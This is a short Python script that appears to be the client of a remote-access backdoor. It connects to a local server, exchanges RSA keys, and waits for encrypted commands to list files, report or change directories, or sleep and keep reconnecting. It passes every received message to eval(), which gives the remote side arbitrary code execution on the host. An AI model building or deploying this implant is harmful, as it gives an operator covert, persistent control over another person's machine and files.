from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import utils
import socket, os, time

def connSetup():
    client_socket = socket.socket(socket.AF_INET, 
                                socket.SOCK_STREAM) # Create Socket
    client_socket.connect(("127.0.0.1", 5555))  # Connect to Server

    key_bytes = client_socket.recv(8192)    #Recive Remote Public Key
    remoteKey = serialization.load_pem_public_key(key_bytes)    # Load Remote Public Key

    privateKey = rsa.generate_private_key(65537, 4096)  # Generate RSA Private Key
    publicKey = privateKey.public_key() # Generate RSA Public Key
    toSend = publicKey.public_bytes(encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo) # Format RSA Public Key
    client_socket.send(toSend)  # Send RSA Public Key

    return client_socket, privateKey, remoteKey

def crypt(message: bytes):
    ciphertext = remoteKey.encrypt( # type: ignore
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        ))  # Encrypt message
    
    return ciphertext

def decrypt(message: bytes):
    mensaje_descifrado = privateKey.decrypt(
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        ))  # Decrypt message
    return mensaje_descifrado.decode()

client_socket, privateKey, remoteKey = connSetup() # Start connection

# Main Code
while True:
    path = os.getcwd()
    client_socket.send(crypt(path.encode()))
    data = client_socket.recv(8192)
    data = decrypt(data)
    try: 
        data = eval(data)
        command = data[0]
    except NameError:
        command = data
    
    if command == "ls":
        path = os.listdir()
        client_socket.send(crypt(str(path).encode()))

    elif command == "pwd":
        Dir = os.getcwd()
        client_socket.send(crypt(Dir.encode()))

    elif command == "cd":
        os.chdir(data[1])
        
    elif command == "sleep":
        client_socket.close()
        while True:
            time.sleep(30)
            try:
                client_socket, privateKey, remoteKey = connSetup()
                break
            except ConnectionRefusedError:
                continue
    

client_socket.close()   # Clean Connection

